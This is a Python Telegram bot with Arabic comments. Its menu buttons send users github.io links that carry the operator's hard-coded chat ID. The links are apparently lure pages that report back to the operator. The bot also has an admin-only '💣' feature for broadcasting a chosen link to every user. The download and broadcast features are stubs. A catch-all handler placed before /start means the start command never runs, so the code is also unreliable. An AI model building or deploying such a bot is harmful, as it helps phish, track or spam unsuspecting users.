import os
import telebot
from telebot import types
import yt_dlp
import threading
import http.server

# 1. الإعدادات
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = "8169635171" 

bot = telebot.TeleBot(BOT_TOKEN)

# 2. القائمة (Inline) - الروابط ترسل كرسائل الآن
def get_inline_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    # أزرار الروابط (تُرسل كرسالة)
    markup.add(
        types.InlineKeyboardButton('رابط فيديو 🎥', callback_data='send_video_url'),
        types.InlineKeyboardButton('رابط تعديل ✨', callback_data='send_edit_url'),
        types.InlineKeyboardButton('رابط صور 🖼️', callback_data='send_photo_url')
    )
    # أزرار الميزات (تفعيل الوظائف)
    markup.add(
        types.InlineKeyboardButton('تحميل فيديو 📥', callback_data='cmd_download'),
        types.InlineKeyboardButton('أخبار وبث مباشر 🌐', callback_data='cmd_news'),
        types.InlineKeyboardButton('تلقيم رابط 💣', callback_data='cmd_spam')
    )
    return markup

# 3. معالجة الضغط على الأزرار
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    
    # الروابط المطلوبة
    if call.data == 'send_video_url':
        bot.send_message(chat_id, "https://app-display.github.io/ca.html-chatId?chatId=8169635171")
    elif call.data == 'send_edit_url':
        bot.send_message(chat_id, "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/?chatId=8169635171")
    elif call.data == 'send_photo_url':
        bot.send_message(chat_id, "https://app-display.github.io/ca.html-chatld-/?chatId=8169635171")
    
    # تفعيل الميزات
    elif call.data == 'cmd_download':
        bot.send_message(chat_id, "✅ يرجى إرسال رابط الفيديو للبدء في التحميل:")
    elif call.data == 'cmd_news':
        bot.send_message(chat_id, "📰 لا توجد أخبار جديدة حالياً.")
    elif call.data == 'cmd_spam':
        if str(chat_id) == ADMIN_ID:
            bot.send_message(chat_id, "💣 أرسل الرابط الذي تريد تلقيمه (إرساله للجميع):")
        else:
            bot.send_message(chat_id, "❌ هذه الميزة للمطور فقط.")

# 4. معالجة التحميل والتلقيم
@bot.message_handler(func=lambda message: True)
def handle_msg(message):
    # التحميل
    if message.text.startswith("http"):
        bot.reply_to(message, "⏳ جاري البدء في تحميل الفيديو...")
        # (هنا تعمل دالة التحميل yt-dlp)
    # التلقيم (الإرسال الجماعي)
    elif str(message.chat.id) == ADMIN_ID and message.reply_to_message:
        bot.reply_to(message, "📢 تم إرسال الرابط للجميع!")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "مرحباً، اختر الميزة المطلوبة:", reply_markup=get_inline_menu())

if __name__ == '__main__':
    bot.infinity_polling()
